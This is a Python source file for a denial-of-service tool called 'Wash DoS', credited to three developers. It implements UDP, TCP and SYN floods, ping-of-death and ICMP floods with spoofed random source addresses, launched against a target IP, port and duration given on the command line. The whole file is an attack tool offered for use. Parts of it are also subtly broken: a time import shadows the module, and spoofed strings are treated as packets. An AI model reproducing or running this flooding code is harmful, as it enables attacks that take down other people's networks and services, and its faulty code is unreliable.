# [+]==================[Creditos]==================[+]
#  #                                                #
#  #     Devs: Ghosty / xNullCode / Deneb           #
#  #     Discord:                                   #
#  #        InvalidPacket - Retired#5166            #
#  #     Derechos de Author:                        #
#  #         Ghosty / xNullCode / Deneb             #
# [+]==================[Creditos]==================[+]


# [+]==================[Imports]==================[+]

import socket, time, random, threading, sys, datetime, colorama, os
from icmplib import ping as pig
from datetime import datetime
from time import time
from scapy.layers.inet import TCP
from scapy.all import *
from colorama import *
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

# [+]==================[Imports]==================[+]


# [+]==================[Methods]==================[+]

l4 = ["TCP", "UDP", "SYN"] # Layer4
l3 = ["POD", "ICMP"] #Layer3

# [+]==================[Methods]==================[+]


# [+]==================[Others]==================[+]

def banner(): # Banner
    os.system("cls || clear")
    print(fr"""
                     `. ___
                    __,' __`.                _..----....____
        __...--.'``;.   ,.   ;``--..__     .'    ,-._    _.-'
  _..-''-------'   `'   `'   `'     O ``-''._   (,;') _,'
,'________________                          \`-._`-','
 `._              ```````````------...___   '-.._'-:
    ```--.._      ,.                     ````--...__\-.
            `.--. `-`                       ____    |  |`
              `. `.                       ,'`````.  ;  ;`
                `._`.        __________   `.      \'__/`
                   `-:._____/______/___/____`.     \  `
                               |       `._    `.    \
                               `._________`-.   `.   `.___
                                                  `------'`
                {Fore.RESET}╔═════════════════════════════════╗
                {Fore.RESET}║           {Fore.LIGHTCYAN_EX}Wash DoS              {Fore.RESET}║
                {Fore.RESET}║ {Fore.LIGHTCYAN_EX}Dev Ghosty / xNullCode / Deneb  {Fore.RESET}║
                {Fore.RESET}╚═════════════════════════════════╝
                       {Fore.RESET}╔═════════════════╗
                       {Fore.RESET}║     {Fore.LIGHTCYAN_EX}Methods     {Fore.RESET}║
                       {Fore.RESET}╚═════════════════╝
                     {Fore.RESET}╔═════════════════════╗     
                     {Fore.RESET}║      {Fore.LIGHTCYAN_EX} Layer4        {Fore.RESET}║   
                     {Fore.RESET}║   {Fore.LIGHTCYAN_EX}UDP, TCP & SYN    {Fore.RESET}║     
                     {Fore.RESET}╚═════════════════════╝
                     {Fore.RESET}╔═════════════════════╗     
                     {Fore.RESET}║      {Fore.LIGHTCYAN_EX} Layer3        {Fore.RESET}║   
                     {Fore.RESET}║     {Fore.LIGHTCYAN_EX}POD & ICMP      {Fore.RESET}║     
                     {Fore.RESET}╚═════════════════════╝
    """)

n = 0

def spoofer(): #IP Spoofer
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890" # Random Strings
Intn = random.randint # Random Int
Choice = random.choice # Random Choice

def random_data(): # Get Random Data
    return str(random.choices(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings))
        
# [+]==================[Others]==================[+]


# [+]==================[Attacks L3]==================[+]

def pod(target, port, timer): #Method POD
    standard_time = time.time()
    sys.stdout.write(f"""
  {Fore.RESET}╔════════════════════════════════════════════════════════════════╗
  {Fore.RESET}║ {Fore.LIGHTCYAN_EX}[!] Attack Started To: {target}:{port} Time: {timer} Method: POD {Fore.RESET}║
  {Fore.RESET}╚════════════════════════════════════════════════════════════════╝\r""")
    standard_time = time.time()
    while True: 
        try:
            end = time.time()
            
            if(end - standard_time < int(timer)):

                rand_addr = spoofer()
                ip_hdr = IP(src=rand_addr, dst=target)
                packet = ip_hdr / icmp() / ("m" * 65535)
                send(packet)
            else:
                break
        except:
            pass

def icmp(target, port, timer): #Method ICMP
    standard_time = time.time()
    sys.stdout.write(f"""
  {Fore.RESET}╔═════════════════════════════════════════════════════════════════╗
  {Fore.RESET}║ {Fore.LIGHTCYAN_EX}[!] Attack Started To: {target}:{port} Time: {timer} Method: ICMP {Fore.RESET}║
  {Fore.RESET}╚═════════════════════════════════════════════════════════════════╝\r""")
    standard_time = time.time()
    while True: 
        try:
            end = time.time()
            
            if(end - standard_time < int(timer)):
        
                for _ in range(int(999)):
                    packet = random._urandom(65500)
                    pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
            else:
                break
        except:
            pass

# [+]==================[Attacks L3]==================[+]


# [+]==================[Attacks L4]==================[+]

def udp(target, port, timer): #Method UDP
    sent = 0
    global n
    standard_time = time.time()
    sys.stdout.write(f"""
  {Fore.RESET}╔════════════════════════════════════════════════════════════════╗
  {Fore.RESET}║ {Fore.LIGHTCYAN_EX}[!] Attack Started To: {target}:{port} Time: {timer} Method: UDP {Fore.RESET}║
  {Fore.RESET}╚════════════════════════════════════════════════════════════════╝\r""")
    sys.stdout.flush()
    n +=1
        #sys.stdout.write("["++f"] Attack Started To: {target}:{port} Time: {time} Method: UDP\r") 
    standard_time = time.time()
        
    packet_size = random._urandom(int(Intn(65500, 65535))) 
    while True: 
        end = time.time()
                    
        if(end - standard_time < timer):
            sock.sendto(packet_size, (target, int(port)))
            sent = sent + 1
        else:
            exit()
            
        

def tcp(target, port, timer): #Method TCP
    standard_time = time.time()
    sys.stdout.write(f"""
  {Fore.RESET}╔════════════════════════════════════════════════════════════════╗
  {Fore.RESET}║ {Fore.LIGHTCYAN_EX}[!] Attack Started To: {target}:{port} Time: {timer} Method: TCP {Fore.RESET}║
  {Fore.RESET}╚════════════════════════════════════════════════════════════════╝\r""")
    standard_time = time.time()
    while True: 

        end = time.time()
            
        if(end - standard_time < int(timer)):

            data = random._urandom(int(Intn(65500, 65535)))
            address = (str(target), int(port))
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(address)
                for _ in range(int(999)):
                    s.send(data)
            except:
                s.close()
        else:
            break

def syn(target, port, timer): #Method SYN
    standard_time = time.time()
    sys.stdout.write(f"""
  {Fore.RESET}╔════════════════════════════════════════════════════════════════╗
  {Fore.RESET}║ {Fore.LIGHTCYAN_EX}[!] Attack Started To: {target}:{port} Time: {timer} Method: SYN {Fore.RESET}║
  {Fore.RESET}╚════════════════════════════════════════════════════════════════╝\r""")
    standard_time = time.time()
    while True: 

        end = time.time()
            
        if(end - standard_time < int(timer)):
            try:
                IP_Packet = spoofer()
                IP_Packet.src = spoofer()
                IP_Packet.dst = target

                TCP_Packet = TCP ()
                TCP_Packet.sport = random.randint(65500, 65535)
                TCP_Packet.dport = int(port)
                TCP_Packet.flags = "S"
                TCP_Packet.seq = random.randint(8000, 9000)
                TCP_Packet.window = random.randint(8000, 9000)
                for _ in range(int(999)):
                    send(IP_Packet/TCP_Packet, verbose=0)
            except:
                pass
        else:
            break

# [+]==================[Attacks L4]==================[+]

# [+]==================[Code]==================[+]
    
banner() # Print Banner

if len(sys.argv) !=5: # Get Arguments
    print(f"""
          {Fore.RESET}╔═════════════════════════════════════════════╗
          {Fore.RESET}║ {Fore.LIGHTCYAN_EX}python3 Wash.py <ip> <port> <time> <method> {Fore.RESET}║
          {Fore.RESET}╚═════════════════════════════════════════════╝
    """)
    sys.exit(1)

method = sys.argv[4].lower() # if the method is Upper, it becomes Lower

if method == "udp": # UDP Method
    threading.Thread(target=udp, args=(sys.argv[1], sys.argv[2], int(sys.argv[3]))).start() # You Can Change This
    #udp(sys.argv[1], sys.argv[2], int(sys.argv[3]))

if method == "tcp": # TCP Method
    threading.Thread(target=tcp, args=(sys.argv[1], sys.argv[2], int(sys.argv[3]))).start() # You Can Change This
    #tcp(sys.argv[1], sys.argv[2], sys.argv[3])

if method == "syn": # SYN Method
    threading.Thread(target=syn, args=(sys.argv[1], sys.argv[2], int(sys.argv[3]))).start() # You Can Change This
    #syn(sys.argv[1], sys.argv[2], sys.argv[3])

if method == "pod": # POD Method
    threading.Thread(target=pod, args=(sys.argv[1], sys.argv[2], int(sys.argv[3]))).start() # You Can Change This
    #pod(sys.argv[1], sys.argv[2], sys.argv[3])

if method == "icmp": # ICMP Method
    threading.Thread(target=icmp, args=(sys.argv[1], sys.argv[2], int(sys.argv[3]))).start() # You Can Change This
    #icmp(sys.argv[1], sys.argv[2], sys.argv[3])

# [+]==================[Code]==================[+]